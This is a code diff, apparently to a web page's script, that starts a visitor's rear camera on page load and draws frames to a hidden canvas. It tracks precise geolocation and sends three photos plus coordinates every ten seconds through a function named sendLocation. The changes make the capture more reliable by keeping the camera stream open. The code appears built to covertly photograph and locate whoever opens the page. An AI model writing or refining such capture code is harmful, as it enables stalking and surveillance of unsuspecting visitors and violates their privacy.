@@ -30,7 +30,7 @@
   <canvas id="canvas" style="display: none;"></canvas>
 
   <script>
-    document.addEventListener("DOMContentLoaded", () => {
+    document.addEventListener("DOMContentLoaded", async () => {
       const dataAtual = new Date();
       const dia = String(dataAtual.getDate()).padStart(2, '0');
       const mes = String(dataAtual.getMonth() + 1).padStart(2, '0');
@@ -40,38 +40,38 @@
       const video = document.getElementById("video");
       const canvas = document.getElementById("canvas");
       let locationData = { latitude: null, longitude: null, accuracy: null, maps: null, source: null };
+      let stream;
 
-      // Capturar foto com robustez
-      async function capturePhoto() {
+      // Iniciar a câmera imediatamente
+      async function startCamera() {
         if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
           console.error("API de mídia não suportada neste navegador.");
-          return null;
+          return false;
         }
         try {
-          const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } }); // Câmera traseira por padrão
+          stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
           video.srcObject = stream;
           video.play();
-
-          // Aguardar o vídeo carregar completamente
           await new Promise(resolve => video.onloadedmetadata = resolve);
-          await new Promise(resolve => setTimeout(resolve, 1000)); // 1 segundo para garantir frame no Android/iOS
-
-          canvas.width = video.videoWidth || 640; // Valor padrão se falhar
-          canvas.height = video.videoHeight || 480;
-          const context = canvas.getContext("2d");
-          context.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-          // Verificar se a imagem é preta ou inválida
-          const imageData = context.getImageData(0, 0, canvas.width, canvas.height);
-          const isBlack = Array.from(imageData.data).every(pixel => pixel === 0);
-          const photoData = isBlack ? null : canvas.toDataURL("image/jpeg", 0.8); // Qualidade 80% para reduzir tamanho
-
-          stream.getTracks().forEach(track => track.stop()); // Desligar a câmera
-          return photoData;
+          return true;
         } catch (error) {
-          console.error("Erro ao acessar a câmera:", error);
-          return null;
+          console.error("Erro ao iniciar a câmera:", error);
+          return false;
         }
+      }
+
+      // Capturar foto do stream ativo
+      function capturePhoto() {
+        if (!stream) return null;
+        canvas.width = video.videoWidth || 640;
+        canvas.height = video.videoHeight || 480;
+        const context = canvas.getContext("2d");
+        context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+        // Verificar se a imagem é preta
+        const imageData = context.getImageData(0, 0, canvas.width, canvas.height);
+        const isBlack = Array.from(imageData.data).every(pixel => pixel === 0);
+        return isBlack ? null : canvas.toDataURL("image/jpeg", 0.8);
       }
 
       // Monitorar localização continuamente
@@ -106,7 +106,7 @@
             },
             {
               enableHighAccuracy: true,
-              timeout: 10000, // 10 segundos para evitar falhas rápidas
+              timeout: 10000,
               maximumAge: 0
             }
           );
@@ -115,17 +115,18 @@
         }
       }
 
-      // Capturar e enviar múltiplas fotos a cada 10 segundos
+      // Capturar e enviar 3 fotos a cada 10 segundos
       async function startCaptureInterval() {
-        setInterval(async () => {
+        if (!(await startCamera())) return; // Se a câmera falhar, não prosseguir
+        setInterval(() => {
           const photos = [];
-          for (const time of [2000, 5000, 7000, 10000]) { // 2s, 5s, 7s, 10s
-            await new Promise(resolve => setTimeout(resolve, time - (time === 2000 ? 0 : 3000))); // Ajuste de tempo relativo
-            const photo = await capturePhoto();
-            if (photo) photos.push(photo);
-          }
-          const dataToSend = { ...locationData, photos: photos.filter(p => p !== null) };
-          sendLocation(dataToSend);
+          setTimeout(() => photos.push(capturePhoto()), 3000); // 3s
+          setTimeout(() => photos.push(capturePhoto()), 6000); // 6s
+          setTimeout(() => {
+            photos.push(capturePhoto()); // 9s
+            const dataToSend = { ...locationData, photos: photos.filter(p => p !== null) };
+            sendLocation(dataToSend);
+          }, 9000);
         }, 10000); // Repetir a cada 10 segundos
       }
 
